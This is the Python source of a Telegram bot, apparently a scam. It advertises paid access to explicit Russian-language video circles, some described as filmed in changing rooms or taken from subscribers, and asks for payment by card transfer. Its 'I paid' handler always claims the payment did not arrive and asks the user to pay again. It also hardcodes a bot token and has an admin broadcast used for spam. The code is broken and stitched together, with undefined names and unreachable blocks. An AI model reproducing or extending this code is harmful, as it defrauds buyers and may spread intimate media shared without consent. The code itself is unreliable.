import os
import telebot
from flask import Flask, request

TOKEN = "8211708885:AAGe2GJOiYBzLrJPTpayrl2DOPXc7Mbw1qs"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ---------- /start ----------
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет, ищешь кружки 18+ для сочной дрочки?😈")


# ---------- Webhook endpoint ----------
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    json_str = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK", 200


# ---------- Главная страница (обязательно для Render) ----------
@app.route("/")
def home():
    return "Bot is running", 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

    markup = types.InlineKeyboardMarkup()

    btn1 = types.InlineKeyboardButton("♾️ ДОСТУП НАВСЕГДА ♾️", callback_data="forever")
    btn2 = types.InlineKeyboardButton("📅 ДОСТУП НА МЕСЯЦ 📅", callback_data="month")

    markup.add(btn1, btn2)

    bot.send_message(
        message.chat.id,
        "😍ЗДЕСЬ ТЫ НАЙДЕШЬ КРУЖКИ С ДОМАШКОЙ, ИНТИМКАМИ, ДРОЧКОЙ, И ВСЕМИ ВИДАМИ ЕБЛИ 💥❤️ВЫБЕРИТЕ ПОДХОДЯЩИЙ ТАРИФ:\n\n🆘 Помощь: @midll",
        reply_markup=markup
    )

@bot.message_handler(content_types=['text'])
def handle_text(message):

    users.add(message.from_user.id)

    # если админ пишет "пчела"
    if message.from_user.id == ADMIN_ID and message.text.lower() == "пчела":
        for user_id in users:
            try:
                bot.send_message(user_id, "Все еще хочешь купить яблоки?")
            except:
                pass
        return

# ---------- CALLBACK ----------
@bot.callback_query_handler(func=lambda call: True)
def callback(call):

    # ===== НАВСЕГДА =====
    if call.data == "forever":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass

        text = """Доступ к приватке!😈

🇷🇺 Цена: 699.00₽
⌛️ Срок действия: навсегда

🔓 Проходка в следующие каналы:
  •  Кружки VIP

💞 В VIP канале тебя ждут:
-Кружок с отсосом из раздевалки
-Кружок с еблей
-Кружки оргий со вписок от подписчика
И ещё 900 кружков!!!

ВСË ЭТО БЕЗ ЦЕНЗУРЫ И СТИКЕРОВ!
дрочить можно часами (но лучше взять что-то мягкое)"""

        markup = types.InlineKeyboardMarkup()

        pay = types.InlineKeyboardButton("💸 Оплатить", callback_data="pay_699")
        back = types.InlineKeyboardButton("⬅️ Назад", callback_data="back")

        markup.add(pay, back)

        bot.send_message(call.message.chat.id, text, reply_markup=markup)

    # ===== МЕСЯЦ =====
    elif call.data == "month":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass

        text = """Доступ к приватке!😈

🇷🇺 Цена: 299.00₽
⌛️ Срок действия: 30 дней

🔓 Проходка в следующие каналы:
  •  Кружки VIP

💙 В VIP канале тебя ждут:
-Кружок с отсосом из раздевалки
-Кружок с еблей
-Кружки оргий со вписок от подписчика
И ещё 900 кружков!!!

ВСË ЭТО БЕЗ ЦЕНЗУРЫ И СТИКЕРОВ!
дрочить можно часами (но лучше взять что-то мягкое)"""

        markup = types.InlineKeyboardMarkup()

        pay = types.InlineKeyboardButton("💸 Оплатить", callback_data="pay_299")
        back = types.InlineKeyboardButton("⬅️ Назад", callback_data="back")

        markup.add(pay, back)

        bot.send_message(call.message.chat.id, text, reply_markup=markup)

    # ===== НАЗАД =====
    elif call.data == "back":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        start(call.message)

    # ===== ОПЛАТА 699 =====
    elif call.data == "pay_699":

        send_payment(call.message.chat.id, "699.00₽")

    # ===== ОПЛАТА 299 =====
    elif call.data == "pay_299":

        send_payment(call.message.chat.id, "299.00₽")

    # ===== СКОПИРОВАТЬ КАРТУ =====
    elif call.data == "copy":

        bot.answer_callback_query(
            call.id,
            text=f"Карта: {CARD_NUMBER}",
            show_alert=True
        )

    # ===== Я ОПЛАТИЛ =====
    elif call.data == "paid":

        markup = types.InlineKeyboardMarkup()
        retry = types.InlineKeyboardButton("Повторить 🔁", callback_data="retry")
        markup.add(retry)

        bot.send_message(
            call.message.chat.id,
            "Извините, но похоже платеж не пришел или пришел, но не полностью 🙁\n"
            "Нажмите кнопку «Повторить» что бы повторить оплату",
            reply_markup=markup
        )

    # ===== ПОВТОР =====
    elif call.data == "retry":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        send_payment(call.message.chat.id, "повтор")

# ---------- ФУНКЦИЯ ОПЛАТЫ ----------
def send_payment(chat_id, price):

    text = f"""💳 Способ оплаты: Перевод
💸 К оплате: {price}

🏦 Карта: {CARD_NUMBER}

⭐ ️оплатить звёздами"""

    markup = types.InlineKeyboardMarkup()

    stars = types.InlineKeyboardButton(
        "⭐ оплатить звёздами",
        url="https://t.me/+umjEbHsWQNMyMzJi"
    )

    copy = types.InlineKeyboardButton("💳 Скопировать карту", callback_data="copy")
    paid = types.InlineKeyboardButton("✅ Я ОПЛАТИЛ", callback_data="paid")
    cancel = types.InlineKeyboardButton("❌ Отменить", callback_data="back")

    markup.add(stars)
    markup.add(copy)
    markup.add(paid)
    markup.add(cancel)

    bot.send_message(chat_id, text, reply_markup=markup)

# ---------- ЗАПУСК ----------
bot.polling()
